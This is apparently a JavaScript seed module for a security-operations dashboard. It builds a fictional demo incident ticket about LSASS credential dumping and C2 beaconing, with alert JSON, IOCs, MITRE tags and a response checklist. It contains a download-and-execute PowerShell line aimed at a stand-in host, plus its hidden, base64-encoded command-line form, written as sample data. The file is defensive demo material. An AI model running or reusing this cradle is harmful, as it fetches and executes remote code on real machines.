'use strict';

// ─────────────────────────────────────────────────────────────────────────
// Voll ausgefüllter Demo-Incident — Nachweis, dass JEDE Analyse-Deck-Sektion
// wirklich mit Daten befüllt wird (Overview, Network/NAT, Identity, System,
// Commands, IOCs, Threat-Intel, MITRE, Timeline, Evidence/Logs).
//
// Fiktives, in sich stimmiges Szenario: Credential-Dumping (LSASS) via encoded
// PowerShell auf einer Finanz-Workstation, gefolgt von C2-Beaconing. KEINE echten
// IOCs/Schaddaten — reine Demo. `buildDemoIncident()` liefert ein create-fähiges
// Datenobjekt (gegen createTicketSchema validiert, siehe Test).
// ─────────────────────────────────────────────────────────────────────────

// Idempotenz-Marker: der Seed erkennt einen bereits angelegten Demo-Incident daran.
const DEMO_MARKER = 'DEMO-FULL-DECK';

// Encoded PowerShell so kodieren, wie es Windows tut (UTF-16LE → base64), damit der
// Deck-Decoder ihn zurück in Klartext auflöst (zeigt „EncodedCommand erkannt + dekodiert").
const PS_PLAINTEXT = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.telemetry-hub.example/a')";
const PS_ENCODED = Buffer.from(PS_PLAINTEXT, 'utf16le').toString('base64');
const PS_COMMANDLINE = `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${PS_ENCODED}`;

// Demo-SHA256 (kein echter Hash einer echten Datei).
const DEMO_SHA256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';

function isoAgo(minutes) {
  return new Date(Date.now() - minutes * 60_000).toISOString();
}

/** Realistisches Wazuh-Roh-Alert-JSON (vom Wazuh-Normalizer geparst). */
function wazuhRawAlert() {
  const alert = {
    timestamp: isoAgo(6),
    agent: { id: '021', name: 'FIN-WKS-014', ip: '10.0.20.14' },
    manager: { name: 'wazuh-manager' },
    rule: {
      level: 12,
      id: '92213',
      description: 'PowerShell: verdächtiger LSASS-Zugriff mit EncodedCommand',
      firedtimes: 7,
      mail: true,
      groups: ['windows', 'sysmon', 'credential_access'],
      mitre: {
        id: ['T1003.001', 'T1059.001', 'T1071.001'],
        tactic: ['Credential Access', 'Execution', 'Command and Control'],
        technique: ['LSASS Memory', 'PowerShell', 'Web Protocols'],
      },
    },
    data: {
      srcip: '10.0.20.14',
      dstip: '185.220.101.47',
      srcport: '51344',
      dstport: '443',
      protocol: 'TCP',
      win: {
        system: { computer: 'FIN-WKS-014.corp.local', eventID: '10' },
        eventdata: {
          image: 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe',
          targetImage: 'C:\\\\Windows\\\\System32\\\\lsass.exe',
          grantedAccess: '0x1010',
          commandLine: PS_COMMANDLINE,
          user: 'CORP\\\\m.keller',
          hashes: `SHA256=${DEMO_SHA256}`,
        },
      },
    },
    location: 'EventChannel',
  };
  return `Wazuh Alert — Rule 92213 (level 12) · Agent FIN-WKS-014\nRaw Alert (JSON):\n${JSON.stringify(alert, null, 2)}`;
}

/**
 * @param {object} [overrides] optionale Feld-Overrides
 * @returns {object} create-fähiges Ticket-Datenobjekt (alle Deck-Sektionen befüllt)
 */
function buildDemoIncident(overrides = {}) {
  return {
    offenseId: DEMO_MARKER,
    title: 'Credential-Dumping (LSASS) + C2-Beaconing auf FIN-WKS-014',
    category: 'Credential Access / Command & Control',
    useCase: 'LSASS-Zugriff via PowerShell + ausgehendes Beaconing',
    priority: 'critical',
    state: 'OPEN',
    status: 'in_progress',
    source: 'wazuh',
    customer: 'Finanzabteilung',
    analyst: '',
    alertCount: 7,
    kind: 'alert',
    datetime: isoAgo(6),

    // ── Identity ──
    user: 'm.keller',
    email: 'm.keller@corp.example.com',
    dept: 'Finance',
    manager: 'S. Braun',
    userType: 'domain-user',
    accStatus: 'active (nach Vorfall gesperrt empfohlen)',

    // ── Network ──
    srcIp: '10.0.20.14',
    srcFqdn: 'fin-wks-014.corp.local',
    dstIp: '185.220.101.47',
    dstFqdn: 'cdn-sync.telemetry-hub.example',
    extIp: '185.220.101.47',
    extFqdn: 'cdn-sync.telemetry-hub.example',
    sensorIp: '10.0.10.12',
    attackerIp: '185.220.101.47',
    mac: '00:1B:44:11:3A:B7',
    hostname: 'FIN-WKS-014',
    network: 'VLAN20-Finance',
    port: '443',
    protocol: 'TCP',
    vpn: '',
    bytesSent: '4823910',
    bytesRecv: '128377',
    pktsSent: '6210',
    pktsRecv: '1840',
    firewallAction: 'permitted',
    firstSeen: isoAgo(41),
    lastSeen: isoAgo(3),
    eventCount: '7',

    // ── NAT (post-NAT am Perimeter) ──
    postNatSrc: '203.0.113.9',
    postNatSrcFqdn: 'gw-fin.corp.local',
    postNatDst: '185.220.101.47',
    postNatDstFqdn: 'cdn-sync.telemetry-hub.example',

    // ── System ──
    os: 'Windows 10 Pro 22H2 (19045)',
    assetTag: 'FIN-014',
    criticality: 'high',
    process: 'powershell.exe',
    commandLine: PS_COMMANDLINE,
    hash: DEMO_SHA256,
    mitre: 'T1003.001 (LSASS Memory) · T1059.001 (PowerShell) · T1071.001 (Web Protocols)',

    // ── Analysis ──
    description:
      'Sysmon (EventID 10) meldet Prozesszugriff von powershell.exe auf lsass.exe mit '
      + 'GrantedAccess 0x1010 — klassischer LSASS-Dump. Die PowerShell-Instanz wurde mit '
      + '-EncodedCommand/-WindowStyle Hidden gestartet und lädt Code von einem externen Host. '
      + 'Unmittelbar danach ausgehendes HTTPS-Beaconing zu 185.220.101.47 in regelmäßigen '
      + 'Intervallen (Jitter ~10%), 4,8 MB gesendet bei nur 128 KB empfangen — typisches C2-Muster.',
    iocs: [
      '185.220.101.47',
      'cdn-sync.telemetry-hub.example',
      'http://cdn-sync.telemetry-hub.example/a',
      DEMO_SHA256,
      'CORP\\m.keller',
    ].join('\n'),
    logs: wazuhRawAlert(),
    actions:
      '1) Host FIN-WKS-014 vom Netz isoliert (Containment, 12:41).\n'
      + '2) EDR-Snapshot + Memory-Dump gesichert.\n'
      + '3) 185.220.101.47 + Domain am Perimeter geblockt.',
    recommendation:
      'Kennwort von m.keller sofort zurücksetzen, alle Sessions invalidieren, Kerberos-TGT '
      + 'widerrufen. Host neu aufsetzen (kein Clean möglich nach LSASS-Dump). '
      + 'Lateral-Movement von 10.0.20.14 in den letzten 48h prüfen.',
    notes: 'Zweiter Alert derselben Kill-Chain innerhalb 40 min — als Kampagne behandeln.',
    decision: 'incident',
    confidence: 88,

    // ── Payload-Artefakte (Commands/IOCs, speisen die Commands-/Entities-Sektion) ──
    payloads: [
      {
        id: 'demo-pl-cmd',
        type: 'Command',
        raw: PS_COMMANDLINE,
        fields: {
          image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
          commandLine: PS_COMMANDLINE,
          user: 'CORP\\m.keller',
        },
      },
      {
        id: 'demo-pl-script',
        type: 'Script',
        raw: PS_PLAINTEXT,
        fields: { language: 'powershell', decoded: PS_PLAINTEXT },
      },
      { id: 'demo-pl-ip', type: 'IP', raw: '185.220.101.47', fields: { ip: '185.220.101.47', role: 'c2' } },
      { id: 'demo-pl-dom', type: 'Domain', raw: 'cdn-sync.telemetry-hub.example', fields: { domain: 'cdn-sync.telemetry-hub.example' } },
      { id: 'demo-pl-hash', type: 'Hash', raw: DEMO_SHA256, fields: { sha256: DEMO_SHA256 } },
    ],

    // ── Threat-Intel-Einträge ──
    tiEntries: [
      { id: 'demo-ti-1', category: 'Command & Control', actor: 'FIN7 (verdächtigt)', malware: 'Cobalt Strike Beacon', confidence: 'high' },
      { id: 'demo-ti-2', category: 'Credential Access', actor: '', malware: 'Mimikatz-Variante', confidence: 'medium' },
    ],

    // ── Analyst-Workflow (Checkliste + Playbook) ──
    analystState: {
      checklist: [
        { id: 'c1', label: 'Host isoliert', done: true },
        { id: 'c2', label: 'IOCs am Perimeter geblockt', done: true },
        { id: 'c3', label: 'Kennwort zurückgesetzt / Sessions invalidiert', done: false },
        { id: 'c4', label: 'Lateral-Movement-Prüfung abgeschlossen', done: false },
      ],
      playbook: { id: 'pb-credential-theft', step: 2, status: 'in_progress' },
    },

    ...overrides,
  };
}

module.exports = { buildDemoIncident, DEMO_MARKER };
